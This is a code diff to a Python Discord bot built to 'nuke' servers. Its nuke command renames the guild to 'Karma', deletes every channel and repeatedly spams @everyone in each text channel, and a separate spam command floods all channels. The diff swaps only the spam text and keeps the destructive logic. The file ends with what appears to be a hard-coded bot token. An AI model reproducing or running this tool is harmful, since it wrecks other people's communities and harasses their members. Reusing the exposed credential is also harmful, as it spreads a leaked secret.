@@ -29,7 +29,7 @@ async def invite(ctx):
 @client.command()
 async def nuke(ctx):
 
-    await ctx.guild.edit(name='This Server got Nuked By NUKER!') #Decide what to change the server name to
+    await ctx.guild.edit(name='Karma') #Decide what to change the server name to
 
     for c in ctx.guild.channels:
         await c.delete()
@@ -43,18 +43,18 @@ async def nuke(ctx):
 
     for c in ctx.guild.text_channels:
              await c.send('@everyone Nuked by NUKER!') # Put the messages you want to be spammed here
-             await c.send('@everyone Nuked by NUKER!')
-             await c.send('@everyone Nuked by NUKER!')
-             await c.send('@everyone Nuked by NUKER!')
-             await c.send('@everyone Nuked by NUKER!')
+             await c.send('@everyone karma!')
+             await c.send('@everyone karma!')
+             await c.send('@everyone karma!')
+             await c.send('@everyone karma!')
 
 @client.command()
 async def spam(ctx):
     for c in ctx.guild.text_channels:
-             await c.send('@everyone Nuked by NUKER!') #Put what to be spammed in the brackets 
-             await c.send('@everyone Nuked by NUKER!')
-             await c.send('@everyone Nuked by NUKER!')
-             await c.send('@everyone Nuked by NUKER!')
-             await c.send('@everyone Nuked by NUKER!')
+             await c.send('@everyone karma!') #Put what to be spammed in the brackets 
+             await c.send('@everyone karma!')
+             await c.send('@everyone karma!')
+             await c.send('@everyone karma!')
+             await c.send('@everyone karma!')
 
 client.run('OTA0MTEwNDk3MjQ1Mjk4NzQ4.YX2whA.Kk8lX1tD3dGqrGInb_YbXYV1vZs')
